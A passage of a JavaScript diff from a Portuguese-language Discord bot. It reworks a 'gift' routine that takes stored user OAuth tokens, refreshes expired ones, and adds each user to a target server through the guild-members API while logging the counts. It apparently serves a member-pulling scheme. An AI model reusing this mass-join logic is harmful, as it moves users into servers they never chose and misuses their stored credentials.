                     .setFooter({ text: 'Clique no botão abaixo pra parar' }).setTimestamp();
                 const botaoParar = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('gift_parar_' + codigo).setLabel('Parar de Puxar').setEmoji('🛑').setStyle(ButtonStyle.Danger));
-                await progressMsg.edit({ embeds: [embedAtualizada], components: [botaoParar] });
+                try { progressMsg = await progressChannel.send({ embeds: [embedProgresso], components: [botaoParar] }); } catch (err) {}
+            }
+        }
+
+        for (const userData of userList) {
+            const op = client.operacoesGift.get(codigo);
+            if (op && op.parar) { await addLog('Puxada cancelada.', 'erro'); break; }
+            const userId = userData.id;
+            const accessToken = userData.access_token;
+            const refreshToken = userData.refresh_token;
+            if (!accessToken || !userId) { falhas++; processed++; continue; }
+
+            try {
+                let resp = await axios.put(
+                    'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
+                    { access_token: accessToken },
+                    { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
+                );
+
+                // Se token inválido, tenta refresh
+                if (resp.status === 403 && resp.data && resp.data.code === 50025 && refreshToken) {
+                    try {
+                        const params = new URLSearchParams();
+                        params.append('client_id', process.env.CLIENT_ID);
+                        params.append('client_secret', process.env.CLIENT_SECRET);
+                        params.append('grant_type', 'refresh_token');
+                        params.append('refresh_token', refreshToken);
+                        const tokenResp = await axios.post('https://discord.com/api/v10/oauth2/token', params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
+                        const newAccess = tokenResp.data.access_token;
+                        const newRefresh = tokenResp.data.refresh_token;
+                        await users.set(userId, Object.assign({}, userData, { access_token: newAccess, refresh_token: newRefresh }));
+                        console.log('✅ [REFRESH] renovado: ' + userId);
+                        resp = await axios.put(
+                            'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
+                            { access_token: newAccess },
+                            { headers: { Authorization: 'Bot ' + process.env.TOKEN, 'Content-Type': 'application/json' }, validateStatus: false }
+                        );
+                    } catch (e) {
+                        console.error('❌ [REFRESH] falhou pra ' + userId + ':', e.response?.data?.error || e.message);
+                    }
+                }
+
+                if (resp.status === 201 || resp.status === 204) {
+                    puxados++;
+                    await addLog('Membro ' + (userData.username || userId) + ' puxado');
+                } else {
+                    falhas++;
+                    await addLog('Falha ' + (userData.username || userId) + ' (' + resp.status + ')', 'erro');
+                }
+            } catch (err) {
+                falhas++;
+                await addLog('Erro ' + (userData.username || userId), 'erro');
+            }
+
+            processed++;
+            if (progressMsg && (processed % 5 === 0 || processed === userList.length)) {
+                try {
+                    const embedAtualizada = new EmbedBuilder()
+                        .setColor(0x5865F2).setTitle('🔄 Puxando — Gift ' + codigo).setDescription('Servidor: **' + guild.name + '**')
+                        .addFields({ name: '📊 Progresso', value: '`' + processed + '/' + userList.length + '`', inline: true }, { name: '✅ Puxados', value: '`' + puxados + '`', inline: true }, { name: '❌ Falhas', value: '`' + falhas + '`', inline: true })
+                        .setFooter({ text: 'Clique no botão abaixo pra parar' }).setTimestamp();
+                    const botaoParar = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('gift_parar_' + codigo).setLabel('Parar de Puxar').setEmoji('🛑').setStyle(ButtonStyle.Danger));
+                    await progressMsg.edit({ embeds: [embedAtualizada], components: [botaoParar] });
+                } catch (err) {}
+            }
+            await new Promise(function(r) { setTimeout(r, 600); });
+        }
+
+        client.operacoesGift.delete(codigo);
+
+        try {
+            const gifts = (await config.get('gifts')) || {};
+            if (gifts[codigo]) { gifts[codigo].puxados = puxados; gifts[codigo].falhas = falhas; await config.set('gifts', gifts); }
+        } catch (err) {}
+
+        await addLog('Finalizado. ' + puxados + ' puxados, ' + falhas + ' falhas.', 'sucesso');
+
+        if (progressMsg) {
+            try {
+                const embedFinal = new EmbedBuilder()
+                    .setColor(puxados > 0 ? 0x57F287 : 0xED4245).setTitle('✅ Gift ' + codigo + ' Finalizado').setDescription('Servidor: **' + guild.name + '**')
+                    .addFields({ name: '📊 Processados', value: '`' + processed + '/' + userList.length + '`', inline: true }, { name: '✅ Puxados', value: '`' + puxados + '`', inline: true }, { name: '❌ Falhas', value: '`' + falhas + '`', inline: true }).setTimestamp();
+                await progressMsg.edit({ embeds: [embedFinal], components: [] });
             } catch (err) {}
         }
-        await new Promise(function(r) { setTimeout(r, 600); });
+        console.log('✅ [GIFT ' + codigo + '] ' + puxados + ' puxados, ' + falhas + ' falhas');
+    } catch (err) {
+        console.error('❌ [puxarMembrosGift] erro:', err.message);
     }
-
-    client.operacoesGift.delete(codigo);
-
-    try {
-        const gifts = (await config.get('gifts')) || {};
-        if (gifts[codigo]) { gifts[codigo].puxados = puxados; gifts[codigo].falhas = falhas; await config.set('gifts', gifts); }
-    } catch (err) {}
-
-    await addLog('Finalizado. Total de ' + puxados + ' membros puxados.', 'sucesso');
-
-    if (progressMsg) {
-        try {
-            const embedFinal = new EmbedBuilder()
-                .setColor(puxados > 0 ? 0x57F287 : 0xED4245).setTitle('✅ Gift ' + codigo + ' Finalizado').setDescription('Servidor: **' + guild.name + '**')
-                .addFields({ name: '📊 Processados', value: '`' + processed + '/' + userList.length + '`', inline: true }, { name: '✅ Puxados', value: '`' + puxados + '`', inline: true }, { name: '❌ Falhas', value: '`' + falhas + '`', inline: true }).setTimestamp();
-            await progressMsg.edit({ embeds: [embedFinal], components: [] });
-        } catch (err) {}
-    }
-    console.log('✅ [GIFT ' + codigo + '] ' + puxados + ' puxados, ' + falhas + ' falhas');
 }
